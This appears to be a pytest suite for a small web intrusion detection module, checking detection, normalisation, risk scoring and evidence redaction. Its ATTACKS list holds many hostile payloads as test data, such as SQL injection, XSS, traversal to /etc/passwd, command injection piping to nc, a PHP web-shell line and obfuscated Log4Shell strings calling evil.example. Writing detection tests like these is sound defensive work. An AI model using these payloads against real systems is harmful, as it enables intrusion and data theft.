import pytest

from ids.rules import inspect_request, risk_score


def scan(path="/", query="", body="", headers=None):
    return inspect_request("GET", path, query, headers or {}, body)


def categories(findings):
    return {f.category for f in findings}


ATTACKS = [
    # SQL injection
    ("sql_injection", dict(query="q=' OR '1'='1")),
    ("sql_injection", dict(query="q=%27+OR+%271%27%3D%271")),
    ("sql_injection", dict(query="q=%2527%2520OR%2520%25271%2527%253D%25271")),  # double-encoded
    ("sql_injection", dict(query="id=1 OR 1=1")),
    ("sql_injection", dict(query="id=1 UNION SELECT username,password FROM users")),
    ("sql_injection", dict(query="id=1 union/**/select 1,2")),
    ("sql_injection", dict(query="id=1;DROP TABLE users")),
    ("sql_injection", dict(query="q=1' AND SLEEP(5)--")),
    ("sql_injection", dict(query="x=@@version")),
    ("sql_injection", dict(body='{"username": "admin\'--", "password": "x"}')),
    ("sql_injection", dict(headers={"cookie": "session=abc' OR '1'='1"})),
    # XSS
    ("xss", dict(query="q=<script>alert(1)</script>")),
    ("xss", dict(query="q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")),
    ("xss", dict(query="q=<img src=x onerror=alert(1)>")),
    ("xss", dict(query="q=<svg/onload=alert(1)>")),
    ("xss", dict(query="url=javascript:alert(1)")),
    ("xss", dict(body="comment=<iframe src=//evil.example>")),
    # Path traversal
    ("path_traversal", dict(query="file=../../../etc/passwd")),
    ("path_traversal", dict(query="file=..%2f..%2f..%2fetc%2fpasswd")),
    ("path_traversal", dict(query="file=%252e%252e%252fsecret")),
    ("path_traversal", dict(query=r"file=..\..\windows\win.ini")),
    ("path_traversal", dict(path="/static/../../etc/passwd")),
    # Command injection
    ("command_injection", dict(query="host=127.0.0.1;cat /etc/passwd")),
    ("command_injection", dict(query="host=8.8.8.8 && whoami")),
    ("command_injection", dict(query="host=$(whoami)")),
    ("command_injection", dict(query="host=`id`")),
    ("command_injection", dict(query="host=a|nc 1.2.3.4 99")),
    # Scanners
    ("scanner", dict(headers={"user-agent": "sqlmap/1.7.2#stable"})),
    ("scanner", dict(headers={"user-agent": "Mozilla/5.00 (Nikto/2.1.6)"})),
    # PHP / code injection
    ("php_injection", dict(body="<?php system($_GET['c']); ?>")),
    ("php_injection", dict(query="page=php://filter/convert.base64-encode/resource=index")),
    ("php_injection", dict(query="x=eval(base64_decode('abc'))")),
    ("php_injection", dict(query="c=system($_GET[0])")),
    # Log4Shell / JNDI (plain and obfuscated)
    ("jndi_injection", dict(query="x=${jndi:ldap://evil.example/a}")),
    ("jndi_injection", dict(headers={"user-agent": "${jndi:ldap://evil.example/a}"})),
    ("jndi_injection", dict(query="x=${${lower:j}ndi:${lower:l}dap://evil.example/a}")),
    ("jndi_injection", dict(query="x=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}")),
    # Template injection
    ("template_injection", dict(query="name={{7*7}}")),
    ("template_injection", dict(query="name=${7*7}")),
    ("template_injection", dict(query="n={{''.__class__.__mro__[1].__subclasses__()}}")),
    # NoSQL injection
    ("nosql_injection", dict(query="user[$ne]=x&pass[$ne]=x")),
    ("nosql_injection", dict(body='{"username": {"$ne": null}, "password": {"$ne": null}}')),
    ("nosql_injection", dict(body='{"$where": "sleep(5000)"}')),
    # CRLF / header injection
    ("crlf_injection", dict(query="redirect=/home%0d%0aSet-Cookie:%20admin=1")),
    ("crlf_injection", dict(query="x=a%0aLocation:%20http://evil.example")),
    # Sensitive file probing
    ("probe", dict(path="/.env")),
    ("probe", dict(path="/.git/config")),
    ("probe", dict(path="/wp-admin/")),
    ("probe", dict(path="/phpmyadmin/index.php")),
    ("probe", dict(path="/backup.sql")),
    ("probe", dict(path="/actuator/env")),
]


@pytest.mark.parametrize("category,request_parts", ATTACKS)
def test_attacks_are_detected(category, request_parts):
    findings = scan(**request_parts)
    assert category in categories(findings), f"missed: {request_parts}"


BENIGN = [
    dict(query="q=red shoes"),
    dict(query="q=O'Brien"),
    dict(query="q=union station schedule"),
    dict(query="q=select a color"),
    dict(query="q=select * from my shopping list"),
    dict(query="q=how to drop a class"),
    dict(query="q=1 or 2 items"),
    dict(query="q=hello; world"),
    dict(query="q=a--b"),
    dict(query="name=John Smith&age=30&city=Delhi"),
    dict(query="redirect=/dashboard/home"),
    dict(path="/products/123/reviews"),
    dict(body='{"title": "Rock & Roll", "color": "#fff", "args": "--verbose"}'),
    dict(body="email=user@example.com&message=Hi, can you call me back?"),
    dict(headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                                "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"}),
    dict(headers={"referer": "https://example.com/page?x=1"}),
    # lookalikes for the Day 2 rules (must NOT be flagged)
    dict(query="q=7*7"),
    dict(query="q=price is $5 {each}"),
    dict(query="q={{name}}"),
    dict(query="q=${total}"),
    dict(query="q=system of equations"),
    dict(query="q=eval(x) in math class"),
    dict(query="sort=price&order=desc&ne=1&gt=2"),
    dict(query="q=line1%0aline2"),
    dict(query="q=a%0d%0ab"),
    dict(query="next=/dashboard"),
    dict(body='{"price": {"min": 5}, "tags": ["new"]}'),
    dict(body='<?xml version="1.0"?><note><to>Sam</to></note>'),
    dict(path="/.well-known/security.txt"),
    dict(path="/environment/settings"),
    dict(path="/gitlab/help"),
    dict(path="/wp-content/uploads/photo.png"),
    dict(path="/backup-policy"),
    dict(path="/products/database-design-book"),
]


def test_crlf_keeps_newlines_but_collapses_spaces():
    from ids.rules import normalize
    assert normalize("a%0d%0aSet-Cookie:%20x") == "a\r\nset-cookie: x"
    assert normalize("A   B\t\tC") == "a b c"


def test_jndi_obfuscation_is_unwrapped():
    from ids.rules import normalize
    assert normalize("${${::-j}${::-n}${::-d}${::-i}:ldap://x}") == "${jndi:ldap://x}"
    assert normalize("${${lower:j}ndi:${lower:l}dap://x}") == "${jndi:ldap://x}"


def test_evidence_never_contains_newlines():
    findings = scan(query="x=a%0d%0aSet-Cookie:%20admin=1")
    assert findings and all("\n" not in f.evidence and "\r" not in f.evidence for f in findings)


@pytest.mark.parametrize("request_parts", BENIGN)
def test_normal_traffic_is_not_flagged(request_parts):
    assert scan(**request_parts) == []


def test_severity_ordering_and_score():
    critical = scan(query="id=1 UNION SELECT a FROM b")
    medium = scan(query="url=javascript:void(0)")
    assert risk_score(critical) > risk_score(medium) > 0
    assert risk_score([]) == 0


def test_extra_rules_raise_the_score_but_cap_at_100():
    findings = scan(query="id=1 UNION SELECT a FROM b; DROP TABLE users -- ' OR 1=1 sleep(5)")
    assert 95 < risk_score(findings) <= 100


def test_evidence_is_redacted_and_short():
    findings = scan(query="password=hunter2&note=' OR password='hunter2")
    assert findings
    for f in findings:
        assert "hunter2" not in f.evidence
        assert len(f.evidence) <= 120


def test_cookie_evidence_is_never_stored():
    findings = scan(headers={"cookie": "session=SECRET123' OR '1'='1"})
    assert findings and all(f.evidence == "[redacted: cookie]" for f in findings)
